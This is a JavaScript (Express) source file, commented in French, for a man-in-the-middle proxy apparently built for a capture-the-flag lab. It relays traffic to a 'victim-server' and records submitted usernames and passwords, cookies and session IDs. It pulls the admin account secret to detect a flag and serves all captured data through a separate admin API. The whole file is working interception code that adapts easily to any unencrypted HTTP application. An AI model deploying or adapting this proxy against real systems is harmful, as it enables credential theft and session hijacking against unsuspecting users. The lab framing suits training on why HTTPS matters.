const express = require('express');
const httpProxy = require('http-proxy');
const bodyParser = require('body-parser');

const app = express();
const PORT = 8888;

// Configuration
const TARGET_HOST = process.env.TARGET_HOST || 'victim-server';
const TARGET_PORT = process.env.TARGET_PORT || 8080;
const TARGET_URL = `http://${TARGET_HOST}:${TARGET_PORT}`;
const DEBUG_MODE = process.env.DEBUG_MODE === 'true';

// Stockage des données interceptées
const interceptedData = {
  credentials: [],
  sessions: [],
  cookies: [],
  requests: [],
  responses: [],
  flags: []
};

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Logger pour le mode debug
function log(message, data = null) {
  if (DEBUG_MODE) {
    console.log(`[MITM] ${message}`);
    if (data) {
      console.log(JSON.stringify(data, null, 2));
    }
  }
}

// Créer un proxy HTTP
const proxy = httpProxy.createProxyServer({
  target: TARGET_URL,
  changeOrigin: true,
  selfHandleResponse: true // Important pour intercepter les réponses
});

// Intercepter et logger toutes les requêtes
app.use((req, res, next) => {
  const timestamp = new Date().toISOString();
  
  log(`${req.method} ${req.url}`, {
    headers: req.headers,
    body: req.body
  });

  // Capturer les credentials lors du login
  if (req.url === '/api/login' && req.method === 'POST') {
    const { username, password } = req.body;
    
    interceptedData.credentials.push({
      timestamp,
      username,
      password,
      ip: req.ip,
      userAgent: req.headers['user-agent']
    });

    console.log(`
╔═══════════════════════════════════════════╗
║  IDENTIFIANTS INTERCEPTÉS !               ║
╠═══════════════════════════════════════════╣
║  Utilisateur: ${username.padEnd(26)}║
║  Mot de passe: ${password.padEnd(25)}║
║  Heure: ${timestamp.substring(0, 19)}    ║
╚═══════════════════════════════════════════╝
    `);
  }

  // Capturer les cookies
  if (req.headers.cookie) {
    interceptedData.cookies.push({
      timestamp,
      url: req.url,
      cookies: req.headers.cookie
    });

    log('Cookies interceptés', { cookies: req.headers.cookie });
  }

  // Logger toutes les requêtes
  interceptedData.requests.push({
    timestamp,
    method: req.method,
    url: req.url,
    headers: req.headers,
    body: req.body
  });

  next();
});

// Proxy toutes les requêtes vers le serveur victime
app.use('/', (req, res) => {
  proxy.web(req, res, {}, (err) => {
    console.error('Erreur proxy:', err);
    res.status(500).json({
      success: false,
      message: 'Erreur proxy',
      error: err.message
    });
  });
});

// Intercepter les réponses
proxy.on('proxyRes', (proxyRes, req, res) => {
  let body = [];

  proxyRes.on('data', (chunk) => {
    body.push(chunk);
  });

  proxyRes.on('end', () => {
    const timestamp = new Date().toISOString();
    body = Buffer.concat(body).toString();
    
    let parsedBody;
    try {
      parsedBody = JSON.parse(body);
    } catch (e) {
      parsedBody = body;
    }

    log(`Response for ${req.method} ${req.url}`, parsedBody);

    // Capturer les session IDs
    if (req.url === '/api/login' && parsedBody.success) {
      const sessionId = parsedBody.sessionId;
      const user = parsedBody.user;

      interceptedData.sessions.push({
        timestamp,
        sessionId,
        user,
        cookies: proxyRes.headers['set-cookie']
      });

      console.log(`
╔═══════════════════════════════════════════╗
║  SESSION DÉTOURNÉE !                      ║
╠═══════════════════════════════════════════╣
║  Utilisateur: ${(user.username || '').padEnd(26)}║
║  Rôle: ${(user.role || '').padEnd(33)}║
║  Session: ${(sessionId || '').substring(0, 28)}  ║
║  Heure: ${timestamp.substring(0, 19)}    ║
╚═══════════════════════════════════════════╝
      `);
    }

    // Capturer les données sensibles du compte
    if (req.url === '/api/account' && parsedBody.success) {
      const secret = parsedBody.user.secret || '';
      const username = parsedBody.user.username || '';
      
      console.log(`
╔═══════════════════════════════════════════╗
║  DONNÉES SENSIBLES INTERCEPTÉES !         ║
╠═══════════════════════════════════════════╣
║  Utilisateur: ${username.padEnd(26)}║
║  Secret: ${secret.substring(0, 32).padEnd(32)}║
║  Solde: $${String(parsedBody.user.balance || 0).padEnd(30)}║
╚═══════════════════════════════════════════╝
      `);

      // Vérifier si c'est un FLAG
      const flagMatch = secret.match(/FLAG\{[^}]+\}/);
      if (flagMatch && username === 'admin') {
        const capturedFlag = flagMatch[0];
        
        // Ajouter le flag si pas déjà capturé
        if (!interceptedData.flags.find(f => f.flag === capturedFlag)) {
          interceptedData.flags.push({
            timestamp,
            flag: capturedFlag,
            username: username,
            method: 'Interception de données du compte MITM'
          });

          console.log(`
╔═══════════════════════════════════════════════════════╗
║  FLAG CAPTURÉ ! ATTAQUE MITM RÉUSSIE !                ║
╠═══════════════════════════════════════════════════════╣
║  ${capturedFlag.padEnd(52)}║
║                                                       ║
║  Félicitations ! Vous avez réussi une attaque        ║
║  Man-in-the-Middle et intercepté le flag secret      ║
║  de l'admin depuis un trafic non chiffré.            ║
║                                                       ║
║  Vecteur d'attaque: Interception trafic HTTP         ║
║  Leçon: Toujours utiliser le chiffrement HTTPS !     ║
╚═══════════════════════════════════════════════════════╝
          `);
        }
      }
    }

    // Logger les réponses
    interceptedData.responses.push({
      timestamp,
      url: req.url,
      status: proxyRes.statusCode,
      headers: proxyRes.headers,
      body: parsedBody
    });

    // ATTAQUE: Modifier la réponse (optionnel)
    if (req.url === '/api/account' && parsedBody.success) {
      // Exemple: Voler le flag et le remplacer
      const stolenSecret = parsedBody.user.secret;
      console.log(`[MITM] Secret volé: ${stolenSecret}`);
      
      // On pourrait modifier ici:
      // parsedBody.user.secret = "Secret stolen by attacker!";
      // body = JSON.stringify(parsedBody);
    }

    // Envoyer la réponse au client
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    res.end(body);
  });
});

// Endpoint API pour voir les données interceptées
const adminApp = express();
adminApp.use(bodyParser.json());

adminApp.get('/intercepted/credentials', (req, res) => {
  res.json({
    success: true,
    count: interceptedData.credentials.length,
    data: interceptedData.credentials
  });
});

adminApp.get('/intercepted/sessions', (req, res) => {
  res.json({
    success: true,
    count: interceptedData.sessions.length,
    data: interceptedData.sessions
  });
});

adminApp.get('/intercepted/cookies', (req, res) => {
  res.json({
    success: true,
    count: interceptedData.cookies.length,
    data: interceptedData.cookies
  });
});

adminApp.get('/intercepted/flags', (req, res) => {
  res.json({
    success: true,
    count: interceptedData.flags.length,
    data: interceptedData.flags,
    message: interceptedData.flags.length > 0 
      ? 'FLAG CAPTURÉ ! Attaque MITM réussie !' 
      : 'Aucun flag capturé pour le moment. Essayez d\'intercepter les données du compte admin.'
  });
});

adminApp.get('/intercepted/all', (req, res) => {
  res.json({
    success: true,
    data: {
      credentials: interceptedData.credentials,
      sessions: interceptedData.sessions,
      cookies: interceptedData.cookies,
      flags: interceptedData.flags,
      totalRequests: interceptedData.requests.length,
      totalResponses: interceptedData.responses.length
    },
    flagCaptured: interceptedData.flags.length > 0
  });
});

adminApp.post('/intercepted/clear', (req, res) => {
  interceptedData.credentials = [];
  interceptedData.sessions = [];
  interceptedData.cookies = [];
  interceptedData.requests = [];
  interceptedData.responses = [];
  interceptedData.flags = [];

  res.json({
    success: true,
    message: 'Toutes les données interceptées ont été effacées'
  });
});

adminApp.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    service: 'mitm-proxy',
    target: TARGET_URL,
    timestamp: new Date().toISOString()
  });
});

// Démarrer le serveur admin sur un port différent
adminApp.listen(8889, () => {
  console.log(`API Admin MITM en cours d'exécution sur le port 8889`);
});

app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════╗
║  PROXY MITM ACTIF                                     ║
╠═══════════════════════════════════════════════════════╣
║  Port Proxy: ${PORT}                                      ║
║  Cible: ${TARGET_URL}                       ║
║  API Admin: http://localhost:8889                     ║
║  Mode Debug: ${DEBUG_MODE ? 'ON ' : 'OFF'}                                  ║
╠═══════════════════════════════════════════════════════╣
║  ATTENTION: Ce proxy intercepte et enregistre TOUT    ║
║  le trafic !                                          ║
║     - Identifiants (nom d'utilisateur/mot de passe)  ║
║     - IDs de session et cookies                       ║
║     - Transmission de données sensibles               ║
║     - Capacité de modification Requête/Réponse        ║
╚═══════════════════════════════════════════════════════╝
  `);
});
